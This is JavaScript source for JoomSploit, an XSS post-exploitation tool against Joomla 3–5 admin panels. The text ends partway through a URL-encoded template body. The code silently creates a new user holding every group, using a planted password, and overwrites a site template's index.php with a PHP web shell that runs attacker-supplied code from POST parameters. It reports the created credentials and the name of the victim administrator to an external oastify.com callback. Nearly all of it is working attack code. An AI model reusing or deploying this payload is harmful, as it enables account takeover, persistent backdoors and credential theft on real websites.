
/*

                               /T /I
                              / |/ | .-~/
                          T\ Y  I  |/  /  _
         /T               | \I  |  I  Y.-~/
        I l   /I       T\ |  |  l  |  T  /
     T\ |  \ Y l  /T   | \I  l   \ `  l Y
 __  | \l   \l  \I l __l  l   \   `  _. |
 \ ~-l  `\   `\  \  \\ ~\  \   `. .-~   |
  \   ~-. "-.  `  \  ^._ ^. "-.  /  \   |
.--~-._  ~-  `  _  ~-_.-"-." ._ /._ ." ./
 >--.  ~-.   ._  ~>-"    "\\   7   7   ]
^.___~"--._    ~-{  .-~ .  `\ Y . /    |
 <__ ~"-.  ~       /_/   \   \I  Y   : |
   ^-.__           ~(_/   \   >._:   | l______
       ^--.,___.-~"  /_/   !  `-.~"--l_ /     ~"-.
              (_/ .  ~(   /'     "~"--,Y   -=b-. _)         JoomSploit (https://github.com/nowak0x01/JoomSploit)
               (_/ .  \  :           / l      c"~o \
                \ /    `.    .     .^   \_.-~"~--.  )
                 (_/ .   `  /     /       !       )/
                  / / _.   '.   .':      /        '
                  ~(_/ .   /    _  `  .-<_
                    /_/ . ' .-~" `.  / \  \          ,z=.
                    ~( /   '  :   | K   "-.~-.______//
                      "-,.    l   I/ \_    __{--->._(==.
                       //(     \  <    ~"~"     //
                      /' /\     \  \     ,v=.  ((
                    .^. / /\     "  }__ //===-  `
                   / / ' '  "-.,__ {---(==-    @Author: Hudson Nowak
                 .^ '       :  T  ~"   ll
                / .  .  . : | :!        \\
               (_/  /   | | j-"          ~^
                 ~-<_(_.^-~"

*/

// ************************************ ~% Variables %~ ************************************ //

var Target = "http://10.5.87.12:8000/"; // Ex: https://192.168.1.99:6731/joomla/
var Callback = "https://prkiw0jsy7n0dj9qknrm57h9006ruji8.oastify.com/"; // Ex: https://collaborator.oastify.com/ (optional) (only if you want to receive feedback at each stage).

// ************************************ ~% Functions %~ ************************************ //

// JLCreateAccount(); // (Privilege Escalation) - Creates an user in Joomla.
// JLEditTemplates(); // (RCE) - Edit Templates in Joomla.
// CustomExploits(); // (Custom) - Custom Exploits for Third-Party Joomla Plugins.

function JLCreateAccount() {

    /* ************************************************************************************************************************************************ */
    var Username = "nowak";         // (It is recommended to use a valid employee name from the target company). - <Mandatory>
    var Name = "Hudson Nowak";                 // Account name, Ex: Robert Silva. - <Mandatory>
    var Password = `j^QEkyvd7*g3`;          // (Password minimum length: 12) [weak password are allowed]. - <Mandatory>
    var Email = "nowak@example.com";  // Ex: user@company.net (It is recommended to use a business email from the target company) (No email will be sent to the email address entered). - <Mandatory>
    /* ************************************************************************************************************************************************ */

    // ************************************ ~% JLEditTemplates Modules %~ ************************************ //
    // [#] Choose one of the available modules [#] //
    // Joomla5CreateAccount();
    // Joomla4CreateAccount();
    // Joomla3CreateAccount();
    /* ************************************************************************************************************************************************ */

    // Joomla 5.x.x Create Account
    function Joomla5CreateAccount() {
        if (Target.substr(-1) != '/') Target += '/';
        var _stage1 = new XMLHttpRequest();
        _stage1.open("GET", Target + "administrator/index.php?option=com_users&view=users", false);
        _stage1.send();

        if (_stage1.responseText) {

            // Verify if the User have access to Admin Panel
            if (_stage1.responseText.match("Joomla Administrator Login")) {
                if (Callback) {
                    var _callback = new XMLHttpRequest();
                    _callback.open("POST", Callback, true);
                    _callback.send(
                        JSON.stringify(
                            {
                                "Host": Target + "administrator/index.php?option=com_users&view=users",
                                "Module": "JLCreateAccount.Joomla5CreateAccount()",
                                "Message": "ERROR: Stage 1 - (The user affected by XSS lacks access to the Admin Panel)",
                                "Date": new Date().toUTCString()
                            }
                        )
                    );
                }

            } else {

                // Identify the user who triggered the XSS
                var URL = _stage1.responseText.match(/<a[^>]*\s*class\s*=\s*["'][^"']*dropdown-item[^"']*["'][^>]*\s*href\s*=\s*["']([^"']*)["'][^>]*>/i)[1];
                URL = URL.replace(/&amp;/g, '&');
                URL = URL.substring(1);
                var _usr = new XMLHttpRequest();
                _usr.open("GET", Target + URL, false);
                _usr.send();
                _usr = _usr.responseText.match(/<input[^>]*\sname=['"]jform\[username]['"][^>]*\svalue=['"]([^'"]*)['"][^>]*>/)[1];

                // Get all roles available
                var _roles = new XMLHttpRequest();
                _roles.open("GET", Target + "administrator/index.php?option=com_users&view=user&layout=edit", false);
                _roles.send();

                var _m = [];
                var _m2 = [];
                var _mX;
                var _mX2;
                var _regx1 = /&ndash;&nbsp;([^<]*)<\/label>/g;
                var _regx2 = /jform\[groups\]\[\]\" value=\"(\d+)\"/g;

                // Extract csrf_token
                var csrf_token = _stage1.responseText.match(/"csrf\.token":"([^"]+)"/)[1];

                // Extract all roles available
                while ((_mX = _regx1.exec(_roles.responseText)) !== null) {
                    _m.push(_mX[1].trim());
                }

                // Extract all numeric roles available
                while ((_mX2 = _regx2.exec(_roles.responseText)) !== null) {
                    _m2.push(_mX2[1]);
                }

                // Create the new User
                var boundary = "--nowak0x01";
                var formData = new FormData();
                formData.append("jform[name]", Name);
                formData.append("jform[username]", Username);
                formData.append("jform[password]", Password);
                formData.append("jform[password2]", Password);
                formData.append("jform[email]", Email);
                formData.append("jform[resetCount]", "0");
                formData.append("jform[sendEmail]", "0");
                formData.append("jform[block]", "0");
                formData.append("jform[requireReset]", "0");
                formData.append("jform[id]", "0");
                // Add all availables Roles to the User
                for (var element of _m2) {
                    formData.append("jform[groups][]", element);
                }
                formData.append("jform[params][a11y_mono]", "0");
                formData.append("jform[params][a11y_contrast]", "0");
                formData.append("jform[params][a11y_highlight]", "0");
                formData.append("jform[params][a11y_font]", "0");
                formData.append("task", "user.save");
                formData.append("return", "");
                formData.append(csrf_token, csrf_token);

                var _stage2 = new XMLHttpRequest();
                _stage2.open("POST", Target + "administrator/index.php?option=com_users&layout=edit&id=0", false);
                _stage2.send(formData);

                // Get Error Messages
                var _regx3 = /<div class="alert alert-danger">(.*?)<\/div>/;
                var _fail = _stage2.responseText.match(_regx3);

                // Get Sucessful Messages
                var _regx4 = /<div class="alert alert-success">(.*?)<\/div>/;
                var _success = _stage2.responseText.match(_regx4);

                if (_fail !== null) {

                    if (Callback) {
                        var _callback = new XMLHttpRequest();
                        _callback.open("POST", Callback, true);
                        _callback.send(
                            JSON.stringify(
                                {
                                    "Host": Target + "administrator/index.php?option=com_users&layout=edit&id=0",
                                    "Message": "ERROR: Stage 2 - (Cannot Create User)",
                                    "Module": "JLCreateAccount.Joomla5CreateAccount()",
                                    "About": _fail,
                                    "Targeted User": _usr,
                                    "Date": new Date().toUTCString()
                                }
                            )
                        );
                    }

                }

                if (_success !== null) {

                    if (Callback) {
                        var _callback = new XMLHttpRequest();
                        _callback.open("POST", Callback, true);
                        _callback.send(
                            JSON.stringify(
                                {
                                    "Host": Target + "administrator/index.php?option=com_users&layout=edit&id=0",
                                    "Message": "User Created Successful!",
                                    "Module": "JLCreateAccount.Joomla5CreateAccount()",
                                    "Data": {
                                        "Name": Name,
                                        "User": Username,
                                        "Email": Email,
                                        "Password": Password,
                                        "Roles": _m
                                    },
                                    "Targeted User": _usr,
                                    "Date": new Date().toUTCString()
                                }
                            )
                        );
                    }
                }
            }

        } else {

            if (Callback) {
                var _callback = new XMLHttpRequest();
                _callback.open("POST", Callback, true);
                _callback.send(
                    JSON.stringify(
                        {
                            "Host": Target + "administrator/index.php?option=com_users&view=users",
                            "Module": "JLCreateAccount.Joomla5CreateAccount()",
                            "Message": "ERROR: Stage 1 - (Cannot Get Server Response!)",
                            "Date": new Date().toUTCString()
                        }
                    )
                );
            }
        }
    }

    // Joomla 4.x.x Create Account
    function Joomla4CreateAccount() {
        if (Target.substr(-1) != '/') Target += '/';
        var _stage1 = new XMLHttpRequest();
        _stage1.open("GET", Target + "administrator/index.php?option=com_users&view=user&layout=edit", false);
        _stage1.send();

        if (_stage1.responseText) {

            // Verify if the User have access to Admin Panel
            if (_stage1.responseText.match("Joomla Administrator Login")) {
                if (Callback) {
                    var _callback = new XMLHttpRequest();
                    _callback.open("POST", Callback, true);
                    _callback.send(
                        JSON.stringify(
                            {
                                "Host": Target + "administrator/index.php?option=com_users&view=user&layout=edit",
                                "Module": "JLCreateAccount.Joomla4CreateAccount()",
                                "Message": "ERROR: Stage 1 - (The user affected by XSS lacks access to the Admin Panel)",
                                "Date": new Date().toUTCString()
                            }
                        )
                    );
                }

            } else {

                // Identify the user who triggered the XSS
                var _usr = new XMLHttpRequest();
                _usr.open("GET", Target + "administrator/index.php?option=com_admin&view=profile&layout=edit", false);
                _usr.send();
                _usr = _usr.responseText.match(/<input[^>]*\sname=['"]jform\[username]['"][^>]*\svalue=['"]([^'"]*)['"][^>]*>/)[1];

                var _m = [];
                var _m2 = [];
                var _mX;
                var _mX2;
                var _regx1 = /&ndash;&nbsp;([^<]*)<\/label>/g;
                var _regx2 = /jform\[groups\]\[\]\" value=\"(\d+)\"/g;

                // Extract csrf_token
                var csrf_token = _stage1.responseText.match(/"csrf\.token":"([^"]+)"/)[1];

                // Extract all roles available
                while ((_mX = _regx1.exec(_stage1.responseText)) !== null) {
                    _m.push(_mX[1].trim());
                }

                // Extract all numeric roles available
                while ((_mX2 = _regx2.exec(_stage1.responseText)) !== null) {
                    _m2.push(_mX2[1]);
                }

                // Create the new User
                var boundary = "--nowak0x01";
                var formData = new FormData();
                formData.append("jform[name]", Name);
                formData.append("jform[username]", Username);
                formData.append("jform[password]", Password);
                formData.append("jform[password2]", Password);
                formData.append("jform[email]", Email);
                formData.append("jform[resetCount]", "0");
                formData.append("jform[sendEmail]", "0");
                formData.append("jform[block]", "0");
                formData.append("jform[requireReset]", "0");
                formData.append("jform[id]", "0");
                // Add all availables Roles to the User
                for (var element of _m2) {
                    formData.append("jform[groups][]", element);
                }
                formData.append("jform[params][a11y_mono]", "0");
                formData.append("jform[params][a11y_contrast]", "0");
                formData.append("jform[params][a11y_highlight]", "0");
                formData.append("jform[params][a11y_font]", "0");
                formData.append("task", "user.save");
                formData.append("return", "");
                formData.append(csrf_token, csrf_token);

                var _stage2 = new XMLHttpRequest();
                _stage2.open("POST", Target + "administrator/index.php?option=com_users&layout=edit&id=0", false);
                _stage2.send(formData);

                // Get Error Messages
                var _regx3 = /<div class="alert alert-danger">(.*?)<\/div>/;
                var _fail = _stage2.responseText.match(_regx3);

                // Get Sucessful Messages
                var _regx4 = /<div class="alert alert-success">(.*?)<\/div>/;
                var _success = _stage2.responseText.match(_regx4);

                if (_fail !== null) {

                    if (Callback) {
                        var _callback = new XMLHttpRequest();
                        _callback.open("POST", Callback, true);
                        _callback.send(
                            JSON.stringify(
                                {
                                    "Host": Target + "administrator/index.php?option=com_users&layout=edit&id=0",
                                    "Message": "ERROR: Stage 2 - (Cannot Create User)",
                                    "Module": "JLCreateAccount.Joomla4CreateAccount()",
                                    "About": _fail,
                                    "Targeted User": _usr,
                                    "Date": new Date().toUTCString()
                                }
                            )
                        );
                    }

                }

                if (_success !== null) {

                    if (Callback) {
                        var _callback = new XMLHttpRequest();
                        _callback.open("POST", Callback, true);
                        _callback.send(
                            JSON.stringify(
                                {
                                    "Host": Target + "administrator/index.php?option=com_users&layout=edit&id=0",
                                    "Message": "User Created Successful!",
                                    "Module": "JLCreateAccount.Joomla4CreateAccount()",
                                    "Data": {
                                        "Name": Name,
                                        "User": Username,
                                        "Email": Email,
                                        "Password": Password,
                                        "Roles": _m
                                    },
                                    "Targeted User": _usr,
                                    "Date": new Date().toUTCString()
                                }
                            )
                        );
                    }
                }
            }

        } else {

            if (Callback) {
                var _callback = new XMLHttpRequest();
                _callback.open("POST", Callback, true);
                _callback.send(
                    JSON.stringify(
                        {
                            "Host": Target + "administrator/index.php?option=com_users&view=user&layout=edit",
                            "Module": "JLCreateAccount.Joomla4CreateAccount()",
                            "Message": "ERROR: Stage 1 - (Cannot Get Server Response!)",
                            "Date": new Date().toUTCString()
                        }
                    )
                );
            }
        }
    }

    // Joomla 3.x.x Create Account
    function Joomla3CreateAccount() {
        if (Target.substr(-1) != '/') Target += '/';
        var _stage1 = new XMLHttpRequest();
        _stage1.open("GET", Target + "administrator/index.php?option=com_users&view=user&layout=edit", false);
        _stage1.send();

        if (_stage1.responseText) {

            // Verify if the User have access to Admin Panel
            if (_stage1.responseText.match("Joomla Administrator Login")) {
                if (Callback) {
                    var _callback = new XMLHttpRequest();
                    _callback.open("POST", Callback, true);
                    _callback.send(
                        JSON.stringify(
                            {
                                "Host": Target + "administrator/index.php?option=com_users&view=user&layout=edit",
                                "Module": "JLCreateAccount.Joomla3CreateAccount()",
                                "Message": "ERROR: Stage 1 - (The user affected by XSS lacks access to the Admin Panel)",
                                "Date": new Date().toUTCString()
                            }
                        )
                    );
                }

            } else {

                // Identify the user who triggered the XSS
                var _usr = new XMLHttpRequest();
                _usr.open("GET", Target + "administrator/index.php?option=com_admin&view=profile&layout=edit", false);
                _usr.send();
                _usr = _usr.responseText.match(/<input[^>]*\sname=['"]jform\[username]['"][^>]*\svalue=['"]([^'"]*)['"][^>]*>/)[1];

                var _m = [];
                var _m2 = [];
                var _mX;
                var _mX2;
                var _regx1 = /&ndash;&nbsp;([^<]*)<\/label>/g;
                var _regx2 = /jform\[groups\]\[\]\" value=\"(\d+)\"/g;

                // Extract csrf_token
                var csrf_token = _stage1.responseText.match(/<input[^>]*\s*type\s*=\s*["']hidden["'][^>]*\s*name\s*=\s*["']([^"']*)["'][^>]*\s*value\s*=\s*["']1["'][^>]*>/i)[1];

                // Extract all roles available
                while ((_mX = _regx1.exec(_stage1.responseText)) !== null) {
                    _m.push(_mX[1].trim());
                }

                // Extract all numeric roles available
                while ((_mX2 = _regx2.exec(_stage1.responseText)) !== null) {
                    _m2.push(_mX2[1]);
                }

                // Create the new User
                var boundary = "--nowak0x01";
                var formData = new FormData();
                formData.append("jform[name]", Name);
                formData.append("jform[username]", Username);
                formData.append("jform[password]", Password);
                formData.append("jform[password2]", Password);
                formData.append("jform[email]", Email);
                formData.append("jform[resetCount]", "0");
                formData.append("jform[sendEmail]", "0");
                formData.append("jform[block]", "0");
                formData.append("jform[requireReset]", "0");
                formData.append("jform[id]", "0");
                // Add all availables Roles to the User
                for (var element of _m2) {
                    formData.append("jform[groups][]", element);
                }
                formData.append("jform[params][a11y_mono]", "0");
                formData.append("jform[params][a11y_contrast]", "0");
                formData.append("jform[params][a11y_highlight]", "0");
                formData.append("jform[params][a11y_font]", "0");
                formData.append("task", "user.save");
                formData.append("return", "");
                formData.append(csrf_token, csrf_token);

                var _stage2 = new XMLHttpRequest();
                _stage2.open("POST", Target + "administrator/index.php?option=com_users&layout=edit&id=0", false);
                _stage2.send(formData);

                // Get Error Messages
                var _fail = _stage2.responseText.match("Save failed with the following error");

                // Get Sucessful Messages
                var _success = _stage2.responseText.match("User successfully saved.");

                if (_fail !== null) {
                    _fail = _stage2.responseText.match(/<div[^>]*\s*class\s*=\s*["']alert-message["'][^>]*>(.*?)<\/div>/i);

                    if (Callback) {
                        var _callback = new XMLHttpRequest();
                        _callback.open("POST", Callback, true);
                        _callback.send(
                            JSON.stringify(
                                {
                                    "Host": Target + "administrator/index.php?option=com_users&layout=edit&id=0",
                                    "Message": "ERROR: Stage 2 - (Cannot Create User)",
                                    "Module": "JLCreateAccount.Joomla3CreateAccount()",
                                    "About": _fail,
                                    "Targeted User": _usr,
                                    "Date": new Date().toUTCString()
                                }
                            )
                        );
                    }

                }

                if (_success !== null) {

                    if (Callback) {
                        var _callback = new XMLHttpRequest();
                        _callback.open("POST", Callback, true);
                        _callback.send(
                            JSON.stringify(
                                {
                                    "Host": Target + "administrator/index.php?option=com_users&layout=edit&id=0",
                                    "Message": "User Created Successful!",
                                    "Module": "JLCreateAccount.Joomla3CreateAccount()",
                                    "Data": {
                                        "Name": Name,
                                        "User": Username,
                                        "Email": Email,
                                        "Password": Password,
                                        "Roles": _m
                                    },
                                    "Targeted User": _usr,
                                    "Date": new Date().toUTCString()
                                }
                            )
                        );
                    }
                }
            }

        } else {

            if (Callback) {
                var _callback = new XMLHttpRequest();
                _callback.open("POST", Callback, true);
                _callback.send(
                    JSON.stringify(
                        {
                            "Host": Target + "administrator/index.php?option=com_users&view=user&layout=edit",
                            "Module": "JLCreateAccount.Joomla3CreateAccount()",
                            "Message": "ERROR: Stage 1 - (Cannot Get Server Response!)",
                            "Date": new Date().toUTCString()
                        }
                    )
                );
            }
        }
    }

}

function JLEditTemplates() {

    /* ************************************************************************************************************************************************ */
    // do not use "<?php" or "?>", your payload is already inside a php tag
    var payload = `
    $callback = base64_decode($_POST['K189mD2j']); // Change This
	$code = base64_decode($_POST['OGa93dka']); // Change This
	if(isset($callback) && $callback != "") {
		if($callback === "phpinfo") phpinfo();
	}
	if(isset($code) && $code != "") $callback($code);
    `;
    /* ************************************************************************************************************************************************ */

    // ************************************ ~% JLEditTemplates Modules %~ ************************************ //
    // [#] Choose one of the available modules [#] //
    // Cassiopeia5();
    // Atum5();
    // Cassiopeia4();
    // Atum4();
    // Protostar();
    // Beez3();
    /* ************************************************************************************************************************************************ */

    // Joomla 5.x.x Site Template: (Cassiopeia)
    function Cassiopeia5() {

        if (Target.substr(-1) != '/') Target += '/';
        var _stage1 = new XMLHttpRequest();
        _stage1.open("GET", Target + "administrator/index.php?option=com_templates&view=templates&client_id=0", false);
        _stage1.send();

        if (_stage1.responseText) {

            if (_stage1.responseText.match("Joomla Administrator Login")) {
                if (Callback) {
                    var _callback = new XMLHttpRequest();
                    _callback.open("POST", Callback, true);
                    _callback.send(
                        JSON.stringify(
                            {
                                "Host": Target + "administrator/index.php?option=com_templates&view=templates&client_id=0",
                                "Module": "JLEditTemplates.Cassiopeia5()",
                                "Message": "ERROR: Stage 1 - (The user affected by XSS lacks access to the Admin Panel)",
                                "Date": new Date().toUTCString()
                            }
                        )
                    );
                }

            } else {

                // Identify the user who triggered the XSS
                var URL = _stage1.responseText.match(/<a[^>]*\s*class\s*=\s*["'][^"']*dropdown-item[^"']*["'][^>]*\s*href\s*=\s*["']([^"']*)["'][^>]*>/i)[1];
                URL = URL.replace(/&amp;/g, '&');
                URL = URL.substring(1);
                var _usr = new XMLHttpRequest();
                _usr.open("GET", Target + URL, false);
                _usr.send();
                _usr = _usr.responseText.match(/<input[^>]*\sname=['"]jform\[username]['"][^>]*\svalue=['"]([^'"]*)['"][^>]*>/)[1];

                // Extract csrf_token
                var csrf_token = _stage1.responseText.match(/"csrf\.token":"([^"]+)"/)[1];

                // Extract (Cassiopeia) Template URI
                var templateURI = _stage1.responseText.match(/<a[^>]*\s*href\s*=\s*["']([^"']*)["'][^>]*>(?:\s*Cassiopeia Details and Files\s*)?<\/a>/i)[1];
                templateURI = templateURI.replace(/&amp;/g, '&');
                templateURI = templateURI.replace(/(\?|&)file=([^&]*)/, `$1file=L2luZGV4LnBocA`);
                templateURI = templateURI.substring(1);

                // Get the ID of the Template URI
                var ID = templateURI.match(/[?&]id=([^&]+)/)[1];

                // Edit index.php file
                var _stage2 = new XMLHttpRequest();
                _stage2.open("POST", Target + templateURI, false);
                _stage2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                _stage2.send(
                    "isMedia=0&jform%5Bsource%5D=%3C%3Fphp%0D%0A%0D%0A%2F**%0D%0A+*+%40package+++++Joomla.Site%0D%0A+*+%40subpackage++Templates.cassiopeia%0D%0A+*%0D%0A+*+%40copyright+++%28C%29+2017+Open+Source+Matters%2C+Inc.+%3Chttps%3A%2F%2Fwww.joomla.org%3E%0D%0A+*+%40license+++++GNU+General+Public+License+version+2+or+later%3B+see+LICENSE.txt%0D%0A+*%2F%0D%0A%0D%0Adefined%28%27_JEXEC%27%29+or+die%3B%0D%0A%0D%0Ause+Joomla%5CCMS%5CFactory%3B%0D%0Ause+Joomla%5CCMS%5CHTML%5CHTMLHelper%3B%0D%0Ause+Joomla%5CCMS%5CLanguage%5CText%3B%0D%0Ause+Joomla%5CCMS%5CUri%5CUri%3B%0D%0A%0D%0A%2F**+%40var+Joomla%5CCMS%5CDocument%5CHtmlDocument+%24this+*%2F%0D%0A%0D%0A%24app+++%3D+Factory%3A%3AgetApplication%28%29%3B%0D%0A%24input+%3D+%24app-%3EgetInput%28%29%3B%0D%0A%24wa++++%3D+%24this-%3EgetWebAssetManager%28%29%3B%0D%0A%0D%0A%2F%2F+Browsers+support+SVG+favicons%0D%0A%24this-%3EaddHeadLink%28HTMLHelper%3A%3A_%28%27image%27%2C+%27joomla-favicon.svg%27%2C+%27%27%2C+%5B%5D%2C+true%2C+1%29%2C+%27icon%27%2C+%27rel%27%2C+%5B%27type%27+%3D%3E+%27image%2Fsvg%2Bxml%27%5D%29%3B%0D%0A%24this-%3EaddHeadLink%28HTMLHelper%3A%3A_%28%27image%27%2C+%27favicon.ico%27%2C+%27%27%2C+%5B%5D%2C+true%2C+1%29%2C+%27alternate+icon%27%2C+%27rel%27%2C+%5B%27type%27+%3D%3E+%27image%2Fvnd.microsoft.icon%27%5D%29%3B%0D%0A%24this-%3EaddHeadLink%28HTMLHelper%3A%3A_%28%27image%27%2C+%27joomla-favicon-pinned.svg%27%2C+%27%27%2C+%5B%5D%2C+true%2C+1%29%2C+%27mask-icon%27%2C+%27rel%27%2C+%5B%27color%27+%3D%3E+%27%23000%27%5D%29%3B%0D%0A%0D%0A%2F%2F+Detecting+Active+Variables%0D%0A%24option+++%3D+%24input-%3EgetCmd%28%27option%27%2C+%27%27%29%3B%0D%0A%24view+++++%3D+%24input-%3EgetCmd%28%27view%27%2C+%27%27%29%3B%0D%0A%24layout+++%3D+%24input-%3EgetCmd%28%27layout%27%2C+%27%27%29%3B%0D%0A%24task+++++%3D+%24input-%3EgetCmd%28%27task%27%2C+%27%27%29%3B%0D%0A%24itemid+++%3D+%24input-%3EgetCmd%28%27Itemid%27%2C+%27%27%29%3B%0D%0A%24sitename+%3D+htmlspecialchars%28%24app-%3Eget%28%27sitename%27%29%2C+ENT_QUOTES%2C+%27UTF-8%27%29%3B%0D%0A%24menu+++++%3D+%24app-%3EgetMenu%28%29-%3EgetActive%28%29%3B%0D%0A%24pageclass+%3D+%24menu+%21%3D%3D+null+%3F+%24menu-%3EgetParams%28%29-%3Eget%28%27pageclass_sfx%27%2C+%27%27%29+%3A+%27%27%3B%0D%0A%0D%0A%2F%2F+Color+Theme%0D%0A%24paramsColorName+%3D+%24this-%3Eparams-%3Eget%28%27colorName%27%2C+%27colors_standard%27%29%3B%0D%0A%24assetColorName++%3D+%27theme.%27+.+%24paramsColorName%3B%0D%0A%24wa-%3EregisterAndUseStyle%28%24assetColorName%2C+%27global%2F%27+.+%24paramsColorName+.+%27.css%27%29%3B%0D%0A%0D%0A" +
                    encodeURIComponent(payload) +
                    "%0D%0A%0D%0A%2F%2F+Use+a+font+scheme+if+set+in+the+template+style+options%0D%0A%24paramsFontScheme+%3D+%24this-%3Eparams-%3Eget%28%27useFontScheme%27%2C+false%29%3B%0D%0A%24fontStyles+++++++%3D+%27%27%3B%0D%0A%0D%0Aif+%28%24paramsFontScheme%29+%7B%0D%0A++++if+%28stripos%28%24paramsFontScheme%2C+%27https%3A%2F%2F%27%29+%3D%3D%3D+0%29+%7B%0D%0A++++++++%24this-%3EgetPreloadManager%28%29-%3Epreconnect%28%27https%3A%2F%2Ffonts.googleapis.com%2F%27%2C+%5B%27crossorigin%27+%3D%3E+%27anonymous%27%5D%29%3B%0D%0A++++++++%24this-%3EgetPreloadManager%28%29-%3Epreconnect%28%27https%3A%2F%2Ffonts.gstatic.com%2F%27%2C+%5B%27crossorigin%27+%3D%3E+%27anonymous%27%5D%29%3B%0D%0A++++++++%24this-%3EgetPreloadManager%28%29-%3Epreload%28%24paramsFontScheme%2C+%5B%27as%27+%3D%3E+%27style%27%2C+%27crossorigin%27+%3D%3E+%27anonymous%27%5D%29%3B%0D%0A++++++++%24wa-%3EregisterAndUseStyle%28%27fontscheme.current%27%2C+%24paramsFontScheme%2C+%5B%5D%2C+%5B%27media%27+%3D%3E+%27print%27%2C+%27rel%27+%3D%3E+%27lazy-stylesheet%27%2C+%27onload%27+%3D%3E+%27this.media%3D%5C%27all%5C%27%27%2C+%27crossorigin%27+%3D%3E+%27anonymous%27%5D%29%3B%0D%0A%0D%0A++++++++if+%28preg_match_all%28%27%2Ffamily%3D%28%5B%5E%3F%3A%5D*%29%3A%2Fi%27%2C+%24paramsFontScheme%2C+%24matches%29+%3E+0%29+%7B%0D%0A++++++++++++%24fontStyles+%3D+%27--cassiopeia-font-family-body%3A+%22%27+.+str_replace%28%27%2B%27%2C+%27+%27%2C+%24matches%5B1%5D%5B0%5D%29+.+%27%22%2C+sans-serif%3B%0D%0A%09%09%09--cassiopeia-font-family-headings%3A+%22%27+.+str_replace%28%27%2B%27%2C+%27+%27%2C+%24matches%5B1%5D%5B1%5D+%3F%3F+%24matches%5B1%5D%5B0%5D%29+.+%27%22%2C+sans-serif%3B%0D%0A%09%09%09--cassiopeia-font-weight-normal%3A+400%3B%0D%0A%09%09%09--cassiopeia-font-weight-headings%3A+700%3B%27%3B%0D%0A++++++++%7D%0D%0A++++%7D+elseif+%28%24paramsFontScheme+%3D%3D%3D+%27system%27%29+%7B%0D%0A++++++++%24fontStylesBody++++%3D+%24this-%3Eparams-%3Eget%28%27systemFontBody%27%2C+%27%27%29%3B%0D%0A++++++++%24fontStylesHeading+%3D+%24this-%3Eparams-%3Eget%28%27systemFontHeading%27%2C+%27%27%29%3B%0D%0A%0D%0A++++++++if+%28%24fontStylesBody%29+%7B%0D%0A++++++++++++%24fontStyles+%3D+%27--cassiopeia-font-family-body%3A+%27+.+%24fontStylesBody+.+%27%3B%0D%0A++++++++++++--cassiopeia-font-weight-normal%3A+400%3B%27%3B%0D%0A++++++++%7D%0D%0A++++++++if+%28%24fontStylesHeading%29+%7B%0D%0A++++++++++++%24fontStyles+.%3D+%27--cassiopeia-font-family-headings%3A+%27+.+%24fontStylesHeading+.+%27%3B%0D%0A++++%09%09--cassiopeia-font-weight-headings%3A+700%3B%27%3B%0D%0A++++++++%7D%0D%0A++++%7D+else+%7B%0D%0A++++++++%24wa-%3EregisterAndUseStyle%28%27fontscheme.current%27%2C+%24paramsFontScheme%2C+%5B%27version%27+%3D%3E+%27auto%27%5D%2C+%5B%27media%27+%3D%3E+%27print%27%2C+%27rel%27+%3D%3E+%27lazy-stylesheet%27%2C+%27onload%27+%3D%3E+%27this.media%3D%5C%27all%5C%27%27%5D%29%3B%0D%0A++++++++%24this-%3EgetPreloadManager%28%29-%3Epreload%28%24wa-%3EgetAsset%28%27style%27%2C+%27fontscheme.current%27%29-%3EgetUri%28%29+.+%27%3F%27+.+%24this-%3EgetMediaVersion%28%29%2C+%5B%27as%27+%3D%3E+%27style%27%5D%29%3B%0D%0A++++%7D%0D%0A%7D%0D%0A%0D%0A%2F%2F+Enable+assets%0D%0A%24wa-%3EusePreset%28%27template.cassiopeia.%27+.+%28%24this-%3Edirection+%3D%3D%3D+%27rtl%27+%3F+%27rtl%27+%3A+%27ltr%27%29%29%0D%0A++++-%3EuseStyle%28%27template.active.language%27%29%0D%0A++++-%3EuseStyle%28%27template.user%27%29%0D%0A++++-%3EuseScript%28%27template.user%27%29%0D%0A++++-%3EaddInlineStyle%28%22%3Aroot+%7B%0D%0A%09%09--hue%3A+214%3B%0D%0A%09%09--template-bg-light%3A+%23f0f4fb%3B%0D%0A%09%09--template-text-dark%3A+%23495057%3B%0D%0A%09%09--template-text-light%3A+%23ffffff%3B%0D%0A%09%09--template-link-color%3A+var%28--link-color%29%3B%0D%0A%09%09--template-special-color%3A+%23001B4C%3B%0D%0A%09%09%24fontStyles%0D%0A%09%7D%22%29%3B%0D%0A%0D%0A%2F%2F+Override+%27template.active%27+asset+to+set+correct+ltr%2Frtl+dependency%0D%0A%24wa-%3EregisterStyle%28%27template.active%27%2C+%27%27%2C+%5B%5D%2C+%5B%5D%2C+%5B%27template.cassiopeia.%27+.+%28%24this-%3Edirection+%3D%3D%3D+%27rtl%27+%3F+%27rtl%27+%3A+%27ltr%27%29%5D%29%3B%0D%0A%0D%0A%2F%2F+Logo+file+or+site+title+param%0D%0Aif+%28%24this-%3Eparams-%3Eget%28%27logoFile%27%29%29+%7B%0D%0A++++%24logo+%3D+HTMLHelper%3A%3A_%28%27image%27%2C+Uri%3A%3Aroot%28false%29+.+htmlspecialchars%28%24this-%3Eparams-%3Eget%28%27logoFile%27%29%2C+ENT_QUOTES%29%2C+%24sitename%2C+%5B%27loading%27+%3D%3E+%27eager%27%2C+%27decoding%27+%3D%3E+%27async%27%5D%2C+false%2C+0%29%3B%0D%0A%7D+elseif+%28%24this-%3Eparams-%3Eget%28%27siteTitle%27%29%29+%7B%0D%0A++++%24logo+%3D+%27%3Cspan+title%3D%22%27+.+%24sitename+.+%27%22%3E%27+.+htmlspecialchars%28%24this-%3Eparams-%3Eget%28%27siteTitle%27%29%2C+ENT_COMPAT%2C+%27UTF-8%27%29+.+%27%3C%2Fspan%3E%27%3B%0D%0A%7D+else+%7B%0D%0A++++%24logo+%3D+HTMLHelper%3A%3A_%28%27image%27%2C+%27logo.svg%27%2C+%24sitename%2C+%5B%27class%27+%3D%3E+%27logo+d-inline-block%27%2C+%27loading%27+%3D%3E+%27eager%27%2C+%27decoding%27+%3D%3E+%27async%27%5D%2C+true%2C+0%29%3B%0D%0A%7D%0D%0A%0D%0A%24hasClass+%3D+%27%27%3B%0D%0A%0D%0Aif+%28%24this-%3EcountModules%28%27sidebar-left%27%2C+true%29%29+%7B%0D%0A++++%24hasClass+.%3D+%27+has-sidebar-left%27%3B%0D%0A%7D%0D%0A%0D%0Aif+%28%24this-%3EcountModules%28%27sidebar-right%27%2C+true%29%29+%7B%0D%0A++++%24hasClass+.%3D+%27+has-sidebar-right%27%3B%0D%0A%7D%0D%0A%0D%0A%2F%2F+Container%0D%0A%24wrapper+%3D+%24this-%3Eparams-%3E